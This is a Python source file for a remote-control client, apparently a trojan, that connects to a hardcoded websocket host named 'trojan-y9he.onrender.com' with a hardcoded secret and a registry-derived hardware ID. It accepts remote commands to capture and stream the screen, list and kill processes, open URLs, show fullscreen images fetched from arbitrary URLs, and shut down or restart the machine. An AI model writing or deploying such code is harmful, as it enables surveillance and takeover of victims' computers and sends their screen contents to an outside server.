import asyncio
import base64
import io
import json
import logging
import os
import platform
import socket
import sys
import threading
import urllib.request
import uuid
import webbrowser
from typing import Any, Dict

import psutil
import websockets
from PIL import Image, ImageGrab

try:
    import mss
    HAS_MSS = True
except ImportError:
    HAS_MSS = False

if getattr(sys, 'frozen', False):
    BASE_DIR = os.path.dirname(sys.executable)
else:
    BASE_DIR = os.path.dirname(os.path.abspath(__file__))

CONFIG_FILE = os.path.join(BASE_DIR, "client_config.json")

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger("PC-Client")

DEFAULT_SERVER_URL = "wss://trojan-y9he.onrender.com/ws/client"
DEFAULT_SECRET = "super_secret_club_key_2026"

def get_hardware_id() -> str:
    """Генерує унікальний ідентифікатор заліза комп'ютера (HWID)."""
    try:
        import hashlib
        if platform.system().lower() == "windows":
            try:
                import winreg
                reg = winreg.ConnectRegistry(None, winreg.HKEY_LOCAL_MACHINE)
                key = winreg.OpenKey(reg, r"SOFTWARE\Microsoft\Cryptography")
                guid, _ = winreg.QueryValueEx(key, "MachineGuid")
                if guid:
                    return hashlib.md5(guid.encode('utf-8')).hexdigest()[:12].upper()
            except Exception:
                pass
        
        node = str(uuid.getnode()) + socket.gethostname()
        return hashlib.md5(node.encode('utf-8')).hexdigest()[:12].upper()
    except Exception:
        return "UNKNOWN_HWID"

def load_or_create_config() -> dict:
    hwid = get_hardware_id()
    default_config = {
        "server_url": DEFAULT_SERVER_URL,
        "secret": DEFAULT_SECRET,
        "pc_name": f"PC_{hwid[:4]}",
        "hwid": hwid
    }

    if not os.path.exists(CONFIG_FILE):
        return default_config

    try:
        with open(CONFIG_FILE, "r", encoding="utf-8") as f:
            data = json.load(f)
            data["hwid"] = hwid
            if "server_url" not in data: data["server_url"] = DEFAULT_SERVER_URL
            if "secret" not in data: data["secret"] = DEFAULT_SECRET
            return data
    except Exception as e:
        logger.error(f"Помилка читання {CONFIG_FILE}: {e}")
        return default_config

def get_screenshot_base64() -> str:
    try:
        img = ImageGrab.grab()
        buffer = io.BytesIO()
        img.convert("RGB").save(buffer, format="JPEG", quality=75, optimize=True)
        return base64.b64encode(buffer.getvalue()).decode("utf-8")
    except Exception as e:
        logger.error(f"Помилка створення скріншоту: {e}")
        raise

def kill_process_by_name(target_name: str) -> int:
    target_lower = target_name.strip().lower()
    killed = 0
    for proc in psutil.process_iter(['pid', 'name']):
        try:
            pname = proc.info['name']
            if pname and (pname.lower() == target_lower or pname.lower().startswith(target_lower.replace(".exe", ""))):
                proc.terminate()
                killed += 1
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            pass
    return killed

def get_process_list() -> list:
    procs = []
    for proc in psutil.process_iter(['pid', 'name', 'memory_info', 'cpu_percent']):
        try:
            mem_mb = (proc.info['memory_info'].rss / (1024 * 1024)) if proc.info['memory_info'] else 0
            procs.append({
                "pid": proc.info['pid'],
                "name": proc.info['name'] or "unknown",
                "memory": round(mem_mb, 1),
                "cpu": proc.info['cpu_percent'] or 0
            })
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            pass
    procs.sort(key=lambda x: x["memory"], reverse=True)
    return procs[:30]

def execute_shutdown():
    if "windows" in platform.system().lower():
        os.system("shutdown /s /t 0")
    else:
        os.system("shutdown -h now")

def execute_restart():
    if "windows" in platform.system().lower():
        os.system("shutdown /r /t 0")
    else:
        os.system("shutdown -r now")

def show_fullscreen_image(img_bytes: bytes, duration: float):
    def _worker():
        try:
            import tkinter as tk
            from PIL import ImageTk

            if not img_bytes or len(img_bytes) < 32:
                logger.error("Отримано порожні або занадто малі дані")
                return

            if img_bytes[:15].lower().startswith(b"<!doctype") or img_bytes[:6].lower().startswith(b"<html"):
                logger.error("Замість картинки отримано HTML")
                return

            pil_img = Image.open(io.BytesIO(img_bytes)).convert("RGB")
            root = tk.Tk()
            root.attributes('-fullscreen', True)
            root.attributes('-topmost', True)
            root.config(cursor="none")
            root.bind('<Escape>', lambda e: root.destroy())

            screen_w = root.winfo_screenwidth()
            screen_h = root.winfo_screenheight()

            pil_img.thumbnail((screen_w, screen_h), Image.Resampling.LANCZOS)
            bg_img = Image.new("RGB", (screen_w, screen_h), "black")
            bg_img.paste(pil_img, ((screen_w - pil_img.width) // 2, (screen_h - pil_img.height) // 2))

            tk_img = ImageTk.PhotoImage(bg_img)
            lbl = tk.Label(root, image=tk_img, bg="black")
            lbl.image = tk_img
            lbl.pack(fill="both", expand=True)

            root.after(int(duration * 1000), root.destroy)
            root.mainloop()
        except Exception as e:
            logger.error(f"Помилка показу картинки: {e}")

    threading.Thread(target=_worker, daemon=True).start()

is_streaming = False
stream_task = None

async def stream_loop(websocket, target_fps=12):
    global is_streaming
    logger.info(f"Початок трансляції екрану ({target_fps} FPS)...")
    delay = max(0.04, 1.0 / target_fps)
    sct = mss.mss() if HAS_MSS else None
    try:
        while is_streaming:
            try:
                if sct:
                    monitor = sct.monitors[1]
                    sct_img = sct.grab(monitor)
                    img = Image.frombytes("RGB", sct_img.size, sct_img.bgra, "raw", "BGRX")
                else:
                    img = ImageGrab.grab()

                if img.width > 960:
                    ratio = 960 / img.width
                    img = img.resize((960, int(img.height * ratio)), Image.Resampling.BILINEAR)

                buf = io.BytesIO()
                img.convert("RGB").save(buf, format="JPEG", quality=45, optimize=False)
                b64_frame = base64.b64encode(buf.getvalue()).decode("utf-8")

                await websocket.send(json.dumps({"type": "stream_frame", "frame": b64_frame}))
                await asyncio.sleep(delay)
            except Exception as e:
                logger.warning(f"Помилка відправки кадру: {e}")
                await asyncio.sleep(0.15)
    finally:
        if sct:
            sct.close()
    logger.info("Трансляцію екрану зупинено.")

async def execute_action(action: str, params: dict, websocket=None) -> dict:
    global is_streaming, stream_task
    try:
        if action == "screenshot":
            return {"status": "ok", "image_base64": get_screenshot_base64()}

        elif action == "start_stream":
            fps = int(params.get("fps", 12))
            if not is_streaming and websocket:
                is_streaming = True
                stream_task = asyncio.create_task(stream_loop(websocket, target_fps=fps))
            return {"status": "ok", "message": f"Стрім запущено ({fps} FPS)"}

        elif action == "show_image":
            image_url = params.get("image_url")
            image_b64 = params.get("image_base64")
            duration = float(params.get("duration", 10))

            try:
                if image_b64:
                    img_data = base64.b64decode(image_b64)
                elif image_url:
                    headers = {
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                        'Accept': 'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8'
                    }
                    req = urllib.request.Request(image_url, headers=headers)
                    with urllib.request.urlopen(req, timeout=15) as resp:
                        img_data = resp.read()
                else:
                    return {"status": "error", "message": "Не вказано картинку"}

                show_fullscreen_image(img_data, duration)
                return {"status": "ok", "message": f"Картинку виведено на весь екран на {duration} сек."}
            except Exception as ex:
                return {"status": "error", "message": f"Помилка завантаження картинки: {ex}"}

        elif action == "stop_stream":
            is_streaming = False
            return {"status": "ok", "message": "Стрім зупинено"}

        elif action == "open_url":
            url = params.get("url")
            if not url: return {"status": "error", "message": "Не вказано URL"}
            webbrowser.open(url)
            return {"status": "ok", "message": f"URL {url} відкрито"}

        elif action == "kill_process":
            proc_name = params.get("name")
            if not proc_name: return {"status": "error", "message": "Не вказано назву процесу"}
            killed = kill_process_by_name(proc_name)
            return {"status": "ok", "killed_count": killed} if killed > 0 else {"status": "error", "message": "Процес не знайдено"}

        elif action == "list_processes":
            return {"status": "ok", "processes": get_process_list()}

        elif action == "restart":
            asyncio.get_event_loop().call_later(1.0, execute_restart)
            return {"status": "ok", "message": "ПК перезавантажується..."}

        elif action == "shutdown":
            asyncio.get_event_loop().call_later(1.0, execute_shutdown)
            return {"status": "ok", "message": "ПК вимикається..."}

        else:
            return {"status": "error", "message": f"Невідома дія: {action}"}

    except Exception as e:
        logger.error(f"Помилка виконання {action}: {e}")
        return {"status": "error", "message": str(e)}

async def heartbeat_sender(websocket):
    while True:
        try:
            stats = {
                "cpu": psutil.cpu_percent(),
                "ram": psutil.virtual_memory().percent,
                "os": platform.system()
            }
            await websocket.send(json.dumps({"type": "heartbeat", "stats": stats}))
            await asyncio.sleep(5)
        except Exception:
            break

async def run_client():
    global is_streaming, stream_task
    cfg = load_or_create_config()
    server_base = cfg["server_url"].rstrip("/")
    secret = cfg["secret"]
    pc_name = cfg["pc_name"]
    hwid = cfg.get("hwid", get_hardware_id())

    uri = f"{server_base}/{pc_name}?secret={secret}&hwid={hwid}"
    logger.info(f"Підключення до сервера (HWID={hwid})...")

    while True:
        try:
            async with websockets.connect(
                uri,
                ping_interval=15,
                ping_timeout=20,
                close_timeout=10,
                max_size=25 * 1024 * 1024
            ) as websocket:
                logger.info("✅ Успішно підключено до сервера!")
                heartbeat_task = asyncio.create_task(heartbeat_sender(websocket))

                try:
                    async for message_str in websocket:
                        try:
                            msg = json.loads(message_str)
                            if msg.get("type") == "assigned_name":
                                logger.info(f"🌟 Цьому ПК офіційно призначено ім'я: {msg.get('pc_name')}")
                                continue

                            req_id = msg.get("request_id")
                            action = msg.get("action")
                            params = msg.get("params", {})
                            logger.info(f"Отримано команду: {action}")
                            result = await execute_action(action, params, websocket=websocket)

                            await websocket.send(json.dumps({
                                "type": "response",
                                "request_id": req_id,
                                **result
                            }))
                        except json.JSONDecodeError:
                            logger.warning(f"Невірний формат повідомлення: {message_str}")
                finally:
                    heartbeat_task.cancel()
                    if is_streaming:
                        is_streaming = False
                        if stream_task:
                            stream_task.cancel()

        except Exception as e:
            logger.warning(f"З'єднання втрачено ({type(e).__name__}: {e}). Перепідключення через 5 секунд...")
            await asyncio.sleep(5)

if __name__ == "__main__":
    try:
        asyncio.run(run_client())
    except KeyboardInterrupt:
        logger.info("Клієнт зупинено.")
